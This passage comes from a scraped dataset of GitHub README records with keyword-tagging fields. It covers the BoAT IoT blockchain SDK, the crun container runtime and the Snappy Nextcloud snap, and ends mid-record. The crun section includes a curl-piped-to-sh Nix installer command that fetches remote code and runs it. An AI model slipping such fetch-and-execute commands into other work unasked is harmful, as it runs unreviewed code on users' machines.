acknowledgments\noriginal darknet @pjreddie : https://pjreddie.com/darknet/\ndarknet fork + yolov4 by @alexeyab : https://github.com/alexeyab/darknet\niou / v-iou tracker by @bochinski : https://github.com/bochinski/iou-tracker/\nnext.js by @zeit : https://github.com/zeit/next.js", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000090, "year": null}, {"Unnamed: 0": 92, "autor": 92, "date": null, "content": "BoAT Framework\nIntroduction\nWelcome to the official implementation of BoAT Framework!\nBoAT blockchain application framework is an IoT-device-oriented lightweight blockchain client SDK written in C language. BoAT stands for Blockchain of AI Things and depicts the vision that a boat transfers trustworthy information from the data source to the data lake.\nThe Pain Point\nMost blockchain or BaaS (Blockchain as a Service) variants bring node or client/wallet software. However, these software are designed for personal computers, cloud servers or smartphones and are usually written in high-level languages like Go, Java, JavaScript, Python, etc. Some require a cumbersome virtual machine or interpreter to execute, and some even have to download code dynamically at runtime. Meanwhile, IoT devices are not as powerful and typically run RTOS or lightweight Linux. Due to constrained resources, most IoT devices could only support native C language applications and thus can hardly access blockchain directly.\nThe Solution\nThere are two methods to resolve the problem. First, the IoT devices send data to a traditional centralized cloud server, the data hub, and then relay the data to the blockchain. This method resolves the problem with some trade-off of higher single-point failure probability at the data hub.\nThe other method is, the IoT devices directly invoke on-chain smart contracts via a blockchain client that meets the device environment and the blockchain. This method allows every IoT device to access blockchain in an independent and distributed way with the trade-off that a C-language blockchain client SDK has to be developed and ported to various device hardware and software environments.\nThe latter is the way BoAT is walking on. To ease off the effort that IoT device manufacturers have to take, aitos.io initiates and contributes to BoAT, the C-language blockchain application framework, enabling IoT devices to access the blockchain easily.\nSupported Blockchains and IoT Modules\nSee Supported List for supported blockchains and IoT modules.\nRelease\nFor full list of new features, please read aitos.io Release Notes.\nProject Status Report\nFor project status update, please visit BoAT Project Status Update Reports.\nQuick Start\nDependencies\nBoAT is tested with the following dependencies:\n(The dependent software with a lower version will most likely work well but are not tested).\nGeneral\nIn general, following dependencies are required:\nDependencies Requirements\nHost OS Depending on the development tool chain of the underlying device\nMake GNU Make (4.3 is tested)\nPython 3.8.3 (Python 2.7 is also compatible)\nFor Cygwin64 or linux_x86_64\nTo build BoAT for demo purpose on a personal computer, following additional dependencies are required:\nDependencies Requirements\ngcc 4.9.2 is tested\nlibcurl 7.55.1 is tested\nopenssl 1.1.1d is tested\nEmbedded devices\nFor embedded devices, the exact configuration depends on the development toolchain of the underlying device.\nLinux-based embedded devices are similar to that on x86_64, except for the exact compiler and dependent library version may be device-specific. Meanwhile, RTOS-based embedded devices are much diverse.\nBefore building the demo\nAs BoAT is a client for blockchain, some environments must be prepared before building the demo.\nMake use of a deployed blockchain or deploy your own blockchain\nFor public blockchains, you must prepare some gas for transaction fees in advance. If a simulator is available for that blockchain, it's a better choice.\nFor consortium blockchains, you must consult the administrator to give you access permission on the blockchains. Or you may deploy your own consortium blockchains node for test purposes.\nDeploy the smart contract\nThe smart contracts used in the demo locate in ./contract.\nFollow the blockchain's official website for details on how to compile and deploy the contract.\nModify the demo code\nModify the demo code in ./demo:\nReplace the private key and account address (if necessary) with an appropriate one\nReplace the smart contract address with the one you got when deploying the contract\nReplace the URL of the blockchain node with the real one\nBuild From Source\nCode Directories\n<SDKRoot>\n|\n+---build | Directory to store object and executable files\n+---demo | Demo application\n+---docs | API reference manual\n+---vendor | Special vendor dependency\n| \\---common | Universal soft algorithms implementation\n| \\---platform | Dependency of different platforms\n+---include | Header files for application to include\n+---lib | Lib files for application to link with\n+---sdk | SDK source\n| +---third-party | Third party libraries\n| +---include | Header files for SDK internal use\n| +---protocol | Blockchain client protocol implementation\n| +---rlp | RLP encoder\n| +---utilities | Utility APIs\n| \\---wallet | SDK entry API implementation\n+---tests | Test cases\n\\---tools | Tools for generating C interface from contract ABI\nNOTE: ./build and ./lib are created in building\nTo build BoAT demo application\n$make demo\nThe built demo application locates at: ./build/demo/boatdemo\nTo build BoAT libraries only\n$make\nor\n$make boatlibs\nThe built libraries locate at: ./lib/libboatwallet.a ./lib/libboatvendor.a\nTo clean everything\n$make clean\nRun BoAT demo on x86_64\nIf BoAT is built for Cygwin or linux-x86_64, run the demo application: real node of an Ethereum compatible blockchain network must be available.\n$chmod a+x ./build/demo/demo_<protocol>/<demo_name>\n$./build/demo/demo_<protocol>/<demo_name>\n<protocol> can be ethereum fiscobcos platone fabric platon hw_bcs.\nMake sure the network connection to the blockchain node (or blockchain simulator) is available.\nUsing BoAT in Your Code\nContract C Interface Generation\nThe smart contract is the code running on the blockchain virtual machine. Smart contracts run like remote API calls. Though the programming language of smart contracts is not C, it has defined ABI (Application Binary Interface). Therefore, remote calls to the contract must follow the ABI.\nHowever, manually applying the rule of ABI is quite complex for embedded C programmers. BoAT IoT Framework SDK provides some tools to generate C interface codes from the ABI. The generated C API can be called from other parts within the C project. Though not all contract ABI can be converted to a C interface due to a lack of object-oriented programming capability, the tools could ease many obligations.\nThe generation tools are written in Python and lie in ./tools.\nCopy the ABI json file generated by truffle or C-tool during contract compilation, to the corresponding directory in ./contract. The generation tool will be called against the ABI file during the making. You can include generated head files (./contract/generated) in your C code to call the APIs.\nHow to Call a Contract in Your C code\nCall BoatWalletCreate() with appropriate configuration to create a wallet. The private key in the configuration must follow the actual key in your control. You can also generate a private key by calling BoatXXWalletGeneratePrivkey() if you know what you\u2019re doing.\nCall BoatXXTxInit() with the wallet reference and other parameters to initialize a transaction object (even if it\u2019s a state-less call), where XX is the blockchain protocol name.\nCall generated C interface API with the initialized transaction object and other arguments.\nCheck the return value of the C interface API. If it\u2019s not NULL, parse the string content as per contract prototype.\nSee demo code for reference.\nTo manually organize a contract call, refer to the generated C API codes. Note that the interface definition is different for different blockchain protocols.\nConfigure Your Makefile and C code\nTo use BoAT in your own code, please following these steps.\nBuild BoAT libraries\nPlace BoAT source somewhere in your project and build BoAT libraries.\nGenerate C interface code\nGenerate C interface code from contract ABI and add the generated C files into project for building. See Contract C Interface Generation for how to generate them.\nModify Makefile of your project\nAdd include file search path:\n<SDKRoot>/include\nPath to generated C interface header file\nAdd to link options all library files in /lib in sequence:\nlibboatwallet.a\nlibboatvendor.a\nAdd to link options: -lcurl\nModify your C code\nAdd include header files:\n#include \"boatconfig.h\"\n#include \"boatiotsdk.h\"\nFollow instructions in How to Call a Contract in Your C code.\nDocumentation\nFor detailed information, please visit BoAT documentation\nFAQ\nTBD\nCommunity\nThe BoAT-X Framework community can be found at:\nContact Mail: info@aitos.io\nReport Bugs: BoAT-X Issues\nMedium: https://aitos-io.medium.com/\nLinkedIn: https://www.linkedin.com/company/aitos-io\nWeChat Group: Add WeChat \"miatang51213\" to join the group\nTo chat with other community members you can join the BoAT-X Gitter\nContribution\nWe are glad to have contributors out of the core team; contributions, including (but not limited to) style/bug fixes, implementation of features, proposals of schemes/algorithms, and thorough documentation, are welcomed. Please refer to our Contribution Guideline for more information.\nFind development documentation at BoAT documentation.\nSubmit Pull Requests at Pull Requests\nLicense\nApache License 2.0, see LICENSE.\nJoin us as a BoAT-Mariner and pioneer your IoT+Blockchain path\nOpen source by aitos.io", "link": "https://github.com/aitos-io/BoAT-X-Framework", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "boat framework\nintroduction\nwelcome to the official implementation of boat framework!\nboat blockchain application framework is an iot-device-oriented lightweight blockchain client sdk written in c language. boat stands for blockchain of ai things and depicts the vision that a boat transfers trustworthy information from the data source to the data lake.\nthe pain point\nmost blockchain or baas (blockchain as a service) variants bring node or client/wallet software. however, these software are designed for personal computers, cloud servers or smartphones and are usually written in high-level languages like go, java, javascript, python, etc. some require a cumbersome virtual machine or interpreter to execute, and some even have to download code dynamically at runtime. meanwhile, iot devices are not as powerful and typically run rtos or lightweight linux. due to constrained resources, most iot devices could only support native c language applications and thus can hardly access blockchain directly.\nthe solution\nthere are two methods to resolve the problem. first, the iot devices send data to a traditional centralized cloud server, the data hub, and then relay the data to the blockchain. this method resolves the problem with some trade-off of higher single-point failure probability at the data hub.\nthe other method is, the iot devices directly invoke on-chain smart contracts via a blockchain client that meets the device environment and the blockchain. this method allows every iot device to access blockchain in an independent and distributed way with the trade-off that a c-language blockchain client sdk has to be developed and ported to various device hardware and software environments.\nthe latter is the way boat is walking on. to ease off the effort that iot device manufacturers have to take, aitos.io initiates and contributes to boat, the c-language blockchain application framework, enabling iot devices to access the blockchain easily.\nsupported blockchains and iot modules\nsee supported list for supported blockchains and iot modules.\nrelease\nfor full list of new features, please read aitos.io release notes.\nproject status report\nfor project status update, please visit boat project status update reports.\nquick start\ndependencies\nboat is tested with the following dependencies:\n(the dependent software with a lower version will most likely work well but are not tested).\ngeneral\nin general, following dependencies are required:\ndependencies requirements\nhost os depending on the development -----> tool !!!  chain of the underlying device\nmake gnu make (4.3 is tested)\npython 3.8.3 (python 2.7 is also compatible)\nfor cygwin64 or linux_x86_64\nto build boat for demo purpose on a personal computer, following additional dependencies are required:\ndependencies requirements\ngcc 4.9.2 is tested\nlibcurl 7.55.1 is tested\nopenssl 1.1.1d is tested\nembedded devices\nfor embedded devices, the exact configuration depends on the development toolchain of the underlying device.\nlinux-based embedded devices are similar to that on x86_64, except for the exact compiler and dependent library version may be device-specific. meanwhile, rtos-based embedded devices are much diverse.\nbefore building the demo\nas boat is a client for blockchain, some environments must be prepared before building the demo.\nmake use of a deployed blockchain or deploy your own blockchain\nfor public blockchains, you must prepare some gas for transaction fees in advance. if a simulator is available for that blockchain, it's a better choice.\nfor consortium blockchains, you must consult the administrator to give you access permission on the blockchains. or you may deploy your own consortium blockchains node for test purposes.\ndeploy the smart contract\nthe smart contracts used in the demo locate in ./contract.\nfollow the blockchain's official website for details on how to compile and deploy the contract.\nmodify the demo code\nmodify the demo code in ./demo:\nreplace the private key and account address (if necessary) with an appropriate one\nreplace the smart contract address with the one you got when deploying the contract\nreplace the url of the blockchain node with the real one\nbuild from source\ncode directories\n<sdkroot>\n|\n+---build | directory to store object and executable files\n+---demo | demo application\n+---docs | api reference manual\n+---vendor | special vendor dependency\n| \\---common | universal soft algorithms implementation\n| \\---platform | dependency of different platforms\n+---include | header files for application to include\n+---lib | lib files for application to link with\n+---sdk | sdk source\n| +---third-party | third party libraries\n| +---include | header files for sdk internal use\n| +---protocol | blockchain client protocol implementation\n| +---rlp | rlp encoder\n| +---utilities | utility apis\n| \\---wallet | sdk entry api implementation\n+---tests | test cases\n\\---tools | tools for generating c interface from contract abi\nnote: ./build and ./lib are created in building\nto build boat demo application\n$make demo\nthe built demo application locates at: ./build/demo/boatdemo\nto build boat libraries only\n$make\nor\n$make boatlibs\nthe built libraries locate at: ./lib/libboatwallet.a ./lib/libboatvendor.a\nto clean everything\n$make clean\nrun boat demo on x86_64\nif boat is built for cygwin or linux-x86_64, run the demo application: real node of an ethereum compatible blockchain network must be available.\n$chmod a+x ./build/demo/demo_<protocol>/<demo_name>\n$./build/demo/demo_<protocol>/<demo_name>\n<protocol> can be ethereum fiscobcos platone fabric platon hw_bcs.\nmake sure the network connection to the blockchain node (or blockchain simulator) is available.\nusing boat in your code\ncontract c interface generation\nthe smart contract is the code running on the blockchain virtual machine. smart contracts run like remote api calls. though the programming language of smart contracts is not c, it has defined abi (application binary interface). therefore, remote calls to the contract must follow the abi.\nhowever, manually applying the rule of abi is quite complex for embedded c programmers. boat iot framework sdk provides some tools to generate c interface codes from the abi. the generated c api can be called from other parts within the c project. though not all contract abi can be converted to a c interface due to a lack of object-oriented programming capability, the tools could ease many obligations.\nthe generation tools are written in python and lie in ./tools.\ncopy the abi json file generated by truffle or c-tool during contract compilation, to the corresponding directory in ./contract. the generation tool will be called against the abi file during the making. you can include generated head files (./contract/generated) in your c code to call the apis.\nhow to call a contract in your c code\ncall boatwalletcreate() with appropriate configuration to create a wallet. the private key in the configuration must follow the actual key in your control. you can also generate a private key by calling boatxxwalletgenerateprivkey() if you know what you\u2019re doing.\ncall boatxxtxinit() with the wallet reference and other parameters to initialize a transaction object (even if it\u2019s a state-less call), where xx is the blockchain protocol name.\ncall generated c interface api with the initialized transaction object and other arguments.\ncheck the return value of the c interface api. if it\u2019s not null, parse the string content as per contract prototype.\nsee demo code for reference.\nto manually organize a contract call, refer to the generated c api codes. note that the interface definition is different for different blockchain protocols.\nconfigure your makefile and c code\nto use boat in your own code, please following these steps.\nbuild boat libraries\nplace boat source somewhere in your project and build boat libraries.\ngenerate c interface code\ngenerate c interface code from contract abi and add the generated c files into project for building. see contract c interface generation for how to generate them.\nmodify makefile of your project\nadd include file search path:\n<sdkroot>/include\npath to generated c interface header file\nadd to link options all library files in /lib in sequence:\nlibboatwallet.a\nlibboatvendor.a\nadd to link options: -lcurl\nmodify your c code\nadd include header files:\n#include \"boatconfig.h\"\n#include \"boatiotsdk.h\"\nfollow instructions in how to call a contract in your c code.\ndocumentation\nfor detailed information, please visit boat documentation\nfaq\ntbd\ncommunity\nthe boat-x framework community can be found at:\ncontact mail: info@aitos.io\nreport bugs: boat-x issues\nmedium: https://aitos-io.medium.com/\nlinkedin: https://www.linkedin.com/company/aitos-io\nwechat group: add wechat \"miatang51213\" to join the group\nto chat with other community members you can join the boat-x gitter\ncontribution\nwe are glad to have contributors out of the core team; contributions, including (but not limited to) style/bug fixes, implementation of features, proposals of schemes/algorithms, and thorough documentation, are welcomed. please refer to our contribution guideline for more information.\nfind development documentation at boat documentation.\nsubmit pull requests at pull requests\nlicense\napache license 2.0, see license.\njoin us as a boat-mariner and pioneer your iot+blockchain path\nopen source by aitos.io", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000092, "year": null}, {"Unnamed: 0": 93, "autor": 93, "date": null, "content": "crun\nA fast and low-memory footprint OCI Container Runtime fully written in C.\ncrun conforms to the OCI Container Runtime specifications (https://github.com/opencontainers/runtime-spec).\nDocumentation\nThe user documentation is available here.\nWhy another implementation?\nWhile most of the tools used in the Linux containers ecosystem are written in Go, I believe C is a better fit for a lower level tool like a container runtime. runc, the most used implementation of the OCI runtime specs written in Go, re-execs itself and use a module written in C for setting up the environment before the container process starts.\ncrun aims to be also usable as a library that can be easily included in programs without requiring an external process for managing OCI containers.\nPerformance\ncrun is faster than runc and has a much lower memory footprint.\nThis is the elapsed time on my machine for running sequentially 100 containers, the containers run /bin/true:\ncrun runc %\n100 /bin/true 0:01.69 0:3.34 -49.4%\ncrun requires fewer resources, so it is also possible to set stricter limits on the memory allowed in the container:\n# podman --runtime /usr/bin/runc run --rm --memory 4M fedora echo it works\nError: container_linux.go:346: starting container process caused \"process_linux.go:327: getting pipe fds for pid 13859 caused \\\"readlink /proc/13859/fd/0: no such file or directory\\\"\": OCI runtime command not found error\n# podman --runtime /usr/bin/crun run --rm --memory 4M fedora echo it works\nit works\ncrun could go much lower than that, and require < 1M. The used 4MB is a hard limit set directly in Podman before calling the OCI runtime.\nDependencies\nThese dependencies are required for the build:\nFedora\n$ sudo dnf install -y make python git gcc automake autoconf libcap-devel \\\nsystemd-devel yajl-devel libseccomp-devel \\\ngo-md2man glibc-static python3-libmount libtool\nRHEL/CentOS 8\n$ sudo yum --enablerepo='*' --disablerepo='media-*' install -y make automake \\\nautoconf gettext \\\nlibtool gcc libcap-devel systemd-devel yajl-devel \\\nlibseccomp-devel python36 libtool git\ngo-md2man is not available on RHEL/CentOS 8, so if you'd like to build the man page, you also need to manually install go-md2man. It can be installed with:\n$ sudo yum --enablerepo='*' install -y golang\n$ export GOPATH=$HOME/go\n$ go get github.com/cpuguy83/go-md2man\n$ export PATH=$PATH:$GOPATH/bin\nUbuntu\n$ sudo apt-get install -y make git gcc build-essential pkgconf libtool \\\nlibsystemd-dev libprotobuf-c-dev libcap-dev libseccomp-dev libyajl-dev \\\ngo-md2man libtool autoconf python3 automake\nAlpine\n# apk add gcc automake autoconf libtool gettext pkgconf git make musl-dev \\\npython3 libcap-dev libseccomp-dev yajl-dev argp-standalone go-md2man\nTumbleweed\n# zypper install make automake autoconf gettext libtool gcc libcap-devel \\\nsystemd-devel libyajl-devel libseccomp-devel python3 libtool go-md2man \\\nglibc-static;\nNote that Tumbleweed requires you to specify libseccomp's header file location as a compiler flag.\n# ./autogen.sh\n# ./configure CFLAGS='-I/usr/include/libseccomp'\n# make\nBuild\nUnless you are also building the Python bindings, Python is needed only by libocispec to generate the C parser at build time, it won't be used afterwards.\nOnce all the dependencies are installed:\n$ ./autogen.sh\n$ ./configure\n$ make\nTo install into default PREFIX (/usr/local):\n$ sudo make install\nShared Libraries\nThe previous build instructions do not enable shared libraries, therefore you will be unable to use libcrun. If you wish to build the shared libraries you can change the previous ./configure statement to ./configure --enable-shared.\nStatic build\nIt is possible to build a statically linked binary of crun by using the officially provided nix package and the derivation of it within this repository. The builds are completely reproducible and will create a x86_64/amd64 stripped ELF binary for glibc.\nNix\nTo build the binaries by locally installing the nix package manager:\n$ curl -L https://nixos.org/nix/install | sh\n$ git clone --recursive https://github.com/containers/crun.git && cd crun\n$ nix build -f nix/\n$ ./result/bin/crun --version\nAnsible\nAn Ansible Role is also available to automate the installation of the above statically linked binary on its supported OS:\n$ sudo su -\n# mkdir -p ~/.ansible/roles\n# cd ~/.ansible/roles\n# git clone https://github.com/alvistack/ansible-role-crun.git crun\n# cd ~/.ansible/roles/crun\n# pip3 install --upgrade --ignore-installed --requirement requirements.txt\n# molecule converge\n# molecule verify", "link": "https://github.com/containers/crun", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "crun\na fast and low-memory footprint oci container runtime fully written in c.\ncrun conforms to the oci container runtime specifications (https://github.com/opencontainers/runtime-spec).\ndocumentation\nthe user documentation is available here.\nwhy another implementation?\nwhile most of the tools used in the linux containers ecosystem are written in go, i believe c is a better fit for a lower level -----> tool !!!  like a container runtime. runc, the most used implementation of the oci runtime specs written in go, re-execs itself and use a module written in c for setting up the environment before the container process starts.\ncrun aims to be also usable as a library that can be easily included in programs without requiring an external process for managing oci containers.\nperformance\ncrun is faster than runc and has a much lower memory footprint.\nthis is the elapsed time on my machine for running sequentially 100 containers, the containers run /bin/true:\ncrun runc %\n100 /bin/true 0:01.69 0:3.34 -49.4%\ncrun requires fewer resources, so it is also possible to set stricter limits on the memory allowed in the container:\n# podman --runtime /usr/bin/runc run --rm --memory 4m fedora echo it works\nerror: container_linux.go:346: starting container process caused \"process_linux.go:327: getting pipe fds for pid 13859 caused \\\"readlink /proc/13859/fd/0: no such file or directory\\\"\": oci runtime command not found error\n# podman --runtime /usr/bin/crun run --rm --memory 4m fedora echo it works\nit works\ncrun could go much lower than that, and require < 1m. the used 4mb is a hard limit set directly in podman before calling the oci runtime.\ndependencies\nthese dependencies are required for the build:\nfedora\n$ sudo dnf install -y make python git gcc automake autoconf libcap-devel \\\nsystemd-devel yajl-devel libseccomp-devel \\\ngo-md2man glibc-static python3-libmount libtool\nrhel/centos 8\n$ sudo yum --enablerepo='*' --disablerepo='media-*' install -y make automake \\\nautoconf gettext \\\nlibtool gcc libcap-devel systemd-devel yajl-devel \\\nlibseccomp-devel python36 libtool git\ngo-md2man is not available on rhel/centos 8, so if you'd like to build the man page, you also need to manually install go-md2man. it can be installed with:\n$ sudo yum --enablerepo='*' install -y golang\n$ export gopath=$home/go\n$ go get github.com/cpuguy83/go-md2man\n$ export path=$path:$gopath/bin\nubuntu\n$ sudo apt-get install -y make git gcc build-essential pkgconf libtool \\\nlibsystemd-dev libprotobuf-c-dev libcap-dev libseccomp-dev libyajl-dev \\\ngo-md2man libtool autoconf python3 automake\nalpine\n# apk add gcc automake autoconf libtool gettext pkgconf git make musl-dev \\\npython3 libcap-dev libseccomp-dev yajl-dev argp-standalone go-md2man\ntumbleweed\n# zypper install make automake autoconf gettext libtool gcc libcap-devel \\\nsystemd-devel libyajl-devel libseccomp-devel python3 libtool go-md2man \\\nglibc-static;\nnote that tumbleweed requires you to specify libseccomp's header file location as a compiler flag.\n# ./autogen.sh\n# ./configure cflags='-i/usr/include/libseccomp'\n# make\nbuild\nunless you are also building the python bindings, python is needed only by libocispec to generate the c parser at build time, it won't be used afterwards.\nonce all the dependencies are installed:\n$ ./autogen.sh\n$ ./configure\n$ make\nto install into default prefix (/usr/local):\n$ sudo make install\nshared libraries\nthe previous build instructions do not enable shared libraries, therefore you will be unable to use libcrun. if you wish to build the shared libraries you can change the previous ./configure statement to ./configure --enable-shared.\nstatic build\nit is possible to build a statically linked binary of crun by using the officially provided nix package and the derivation of it within this repository. the builds are completely reproducible and will create a x86_64/amd64 stripped elf binary for glibc.\nnix\nto build the binaries by locally installing the nix package manager:\n$ curl -l https://nixos.org/nix/install | sh\n$ git clone --recursive https://github.com/containers/crun.git && cd crun\n$ nix build -f nix/\n$ ./result/bin/crun --version\nansible\nan ansible role is also available to automate the installation of the above statically linked binary on its supported os:\n$ sudo su -\n# mkdir -p ~/.ansible/roles\n# cd ~/.ansible/roles\n# git clone https://github.com/alvistack/ansible-role-crun.git crun\n# cd ~/.ansible/roles/crun\n# pip3 install --upgrade --ignore-installed --requirement requirements.txt\n# molecule converge\n# molecule verify", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000093, "year": null}, {"Unnamed: 0": 101, "autor": 101, "date": null, "content": "Snappy Nextcloud\nNextcloud server packaged as a snap. It consists of:\nNextcloud 22\nApache 2.4\nPHP 8.0\nMySQL 8\nRedis 6\nmDNS for network discovery\nHow to install\nThere are a number of releases available. By default you'll get the newest stable one, but you may be interested in others.\nHow to use\nAfter install, assuming you and the device on which it was installed are on the same network, you should be able to reach the Nextcloud installation by visiting <hostname>.local in your browser. If your hostname is localhost or localhost.localdomain, like on an Ubuntu Core device, nextcloud.local will be used instead.\nUpon visiting the Nextcloud installation for the first time, you'll be prompted for an admin username and password. After you provide that information you'll be logged in and able to create users, install apps, and upload files.\nNote that this snap includes a service that runs cron.php every 15 minutes, which will automatically change the cron admin setting to Cron for you.\nRemovable media\nAlso note that the interface providing the ability to access removable media is not automatically connected upon install, so if you'd like to use external storage (or otherwise use a device in /media or /mnt for data), you need to give the snap permission to access removable media by connecting that interface:\n$ sudo snap connect nextcloud:removable-media\nSystem monitoring\nThe System application requires a bit more access to the system than the snap uses by default (e.g. the ability to monitor network hardware, etc.). If you'd like to utilize those features, you'll need to connect the interface that allows that kind of access:\n$ sudo snap connect nextcloud:network-observe\nConfiguration\nBeyond the typical Nextcloud configuration (either by using nextcloud.occ or editing /var/snap/nextcloud/current/nextcloud/config/config.php), the snap exposes extra configuration options via the snap set command.\nHTTP/HTTPS port configuration\nBy default, the snap will listen on port 80. If you enable HTTPS, it will listen on both 80 and 443, and HTTP traffic will be redirected to HTTPS. But perhaps you're putting the snap behind a proxy of some kind, in which case you probably want to change those ports.\nIf you'd like to change the HTTP port (say, to port 81), run:\n$ sudo snap set nextcloud ports.http=81\nTo change the HTTPS port (say, to port 444), run:\n$ sudo snap set nextcloud ports.https=444\nNote that, assuming HTTPS is enabled, this will cause HTTP traffic to be redirected to port 444. You can specify both of these simultaneously as well:\n$ sudo snap set nextcloud ports.http=81 ports.https=444\nNote: Let's Encrypt will expect that Nextcloud is exposed on ports 80 and 443. If you change ports and don't put Nextcloud behind a proxy such that ports 80 and 443 are sent to Nextcloud for that domain name, Let's Encrypt will be unable to verify ownership of your domain and will not grant certificates.\nAlso note: Nextcloud's automatic hostname detection can fail when behind a proxy; you might notice it redirecting incorrectly. If this happens, override the automatic detection (including the port if necessary), e.g.:\n$ sudo nextcloud.occ config:system:set overwritehost --value=\"example.com:81\"\nPHP Memory limit configuration\nBy default, PHP will use 128M as the memory limit. If you notice images not getting previews generated, or errors about memory exhaustion in your Nextcloud log, you may need to set this to a higher value.\nIf you'd like to set the memory limit to a higher value (say, 512M), run:\n$ sudo snap set nextcloud php.memory-limit=512M\nTo set it to be unlimited (not recommended), use -1:\n$ sudo snap set nextcloud php.memory-limit=-1\nCronjob interval configuration\nBy default the cronjob interval is 15 minutes.\nTo adjust it (say, 10 minutes) simply run:\n$ sudo snap set nextcloud nextcloud.cron-interval=10m\nIf you want to disable the cronjob completely, run:\n$ sudo snap set nextcloud nextcloud.cron-interval=-1\nTo reenable it again simply set the nextcloud.cron-interval snap variable to a value that isn't -1\nHTTP compression configuration\nBy default, the snap does not enable HTTP compression. To enable it, run:\n$ sudo snap set nextcloud http.compression=true\nTo disable it, run:\n$ sudo snap set nextcloud http.compression=false\nDebug mode\nBy default, the snap installs itself in production mode, which prevents Apache and PHP from providing any detailed version or library information in the HTTP headers and error pages. Debug mode can be enabled with:\n$ sudo snap set nextcloud mode=debug\n\"debug\" and \"production\" are the only valid modes.\nIncluded CLI utilities\nThere are a few CLI utilities included:\nnextcloud.occ:\nNextcloud's occ configuration tool. You can always edit the config file directly (/var/snap/nextcloud/current/nextcloud/config/config.php) but the configuration tool provides a CLI interface for it. See nextcloud.occ -h for more information. Note that it requires sudo.\nnextcloud.mysql-client:\nMySQL client preconfigured to communicate with Nextcloud MySQL server. This may be useful in case you need to migrate Nextcloud installations. Note that it requires sudo.\nnextcloud.mysqldump:\nDump Nextcloud database to stdout. You should probaby redirect its output to a file. Note that it requires sudo.\nnextcloud.enable-https:\nEnable HTTPS via self-signed certificates, Let's Encrypt, or custom certificates. HTTP will redirect to HTTPS. Non-custom certificates will automatically be kept up-to-date. See nextcloud.enable-https -h for more information. Note that it requires sudo.\nnextcloud.disable-https:\nDisable HTTPS (does not remove certificates). Note that it requires sudo.\nnextcloud.manual-install:\nManually install Nextcloud instead of visiting it in your browser. This allows you to create the admin user via the CLI. Note that it requires sudo.\nnextcloud.export:\nExport data suitable for migrating servers. By default this includes the Nextcloud database, configuration, and data. See nextcloud.export -h for more information. Note that it requires sudo.\nnextcloud.import:\nImport data exported from another Nextcloud snap instance (via nextcloud.export). By default this imports the database, config, and data. See nextcloud.import -h for more information. Note that it requires sudo.\nWhere is my stuff?\n$SNAP_DATA (/var/snap/nextcloud/current/ by default)\nLogs (Apache, PHP, MySQL, Redis, and Nextcloud logs)\nKeys and certificates\nMySQL database\nRedis database\nNextcloud config\nAny Nextcloud apps installed by the user\n$SNAP_COMMON (/var/snap/nextcloud/common/ by default)\nNextcloud data\nHacking\nIf you change something in the snap, build it, install it, and you can run a suite of acceptance tests against it. The tests are written in ruby, using capybara and rspec. To run the tests, you first need to install a few dependencies:\n$ sudo apt install gcc g++ make qt5-default libqt5webkit5-dev ruby-dev zlib1g-dev\n$ sudo gem install bundle\n$ cd tests/\n$ bundle install\nAdditionally, if you do not have X configured, install the following for a 'fake' X server.\n$ sudo apt install xvfb\nMake sure the snap has a user called \"admin\" with password \"admin\" (used for login tests):\n$ sudo nextcloud.manual-install admin admin\nAnd finally, run the tests:\n$ cd tests/\n$ rake test", "link": "https://github.com/nextcloud-snap/nextcloud-snap", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "snappy nextcloud\nnextcloud server packaged as a snap. it consists of:\nnextcloud 22\napache 2.4\nphp 8.0\nmysql 8\nredis 6\nmdns for network discovery\nhow to install\nthere are a number of releases available. by default you'll get the newest stable one, but you may be interested in others.\nhow to use\nafter install, assuming you and the device on which it was installed are on the same network, you should be able to reach the nextcloud installation by visiting <hostname>.local in your browser. if your hostname is localhost or localhost.localdomain, like on an ubuntu core device, nextcloud.local will be used instead.\nupon visiting the nextcloud installation for the first time, you'll be prompted for an admin username and password. after you provide that information you'll be logged in and able to create users, install apps, and upload files.\nnote that this snap includes a service that runs cron.php every 15 minutes, which will automatically change the cron admin setting to cron for you.\nremovable media\nalso note that the interface providing the ability to access removable media is not automatically connected upon install, so if you'd like to use external storage (or otherwise use a device in /media or /mnt for data), you need to give the snap permission to access removable media by connecting that interface:\n$ sudo snap connect nextcloud:removable-media\nsystem monitoring\nthe system application requires a bit more access to the system than the snap uses by default (e.g. the ability to monitor network hardware, etc.). if you'd like to utilize those features, you'll need to connect the interface that allows that kind of access:\n$ sudo snap connect nextcloud:network-observe\nconfiguration\nbeyond the typical nextcloud configuration (either by using nextcloud.occ or editing /var/snap/nextcloud/current/nextcloud/config/config.php), the snap exposes extra configuration options via the snap set command.\nhttp/https port configuration\nby default, the snap will listen on port 80. if you enable https, it will listen on both 80 and 443, and http traffic will be redirected to https. but perhaps you're putting the snap behind a proxy of some kind, in which case you probably want to change those ports.\nif you'd like to change the http port (say, to port 81), run:\n$ sudo snap set nextcloud ports.http=81\nto change the https port (say, to port 444), run:\n$ sudo snap set nextcloud ports.https=444\nnote that, assuming https is enabled, this will cause http traffic to be redirected to port 444. you can specify both of these simultaneously as well:\n$ sudo snap set nextcloud ports.http=81 ports.https=444\nnote: let's encrypt will expect that nextcloud is exposed on ports 80 and 443. if you change ports and don't put nextcloud behind a proxy such that ports 80 and 443 are sent to nextcloud for that domain name, let's encrypt will be unable to verify ownership of your domain and will not grant certificates.\nalso note: nextcloud's automatic hostname detection can fail when behind a proxy; you might notice it redirecting incorrectly. if this happens, override the automatic detection (including the port if necessary), e.g.:\n$ sudo nextcloud.occ config:system:set overwritehost --value=\"example.com:81\"\nphp memory limit configuration\nby default, php will use 128m as the memory limit. if you notice images not getting previews generated, or errors about memory exhaustion in your nextcloud log, you may need to set this to a higher value.\nif you'd like to set the memory limit to a higher value (say, 512m), run:\n$ sudo snap set nextcloud php.memory-limit=512m\nto set it to be unlimited (not recommended), use -1:\n$ sudo snap set nextcloud php.memory-limit=-1\ncronjob interval configuration\nby default the cronjob interval is 15 minutes.\nto adjust it (say, 10 minutes) simply run:\n$ sudo snap set nextcloud nextcloud.cron-interval=10m\nif you want to disable the cronjob completely, 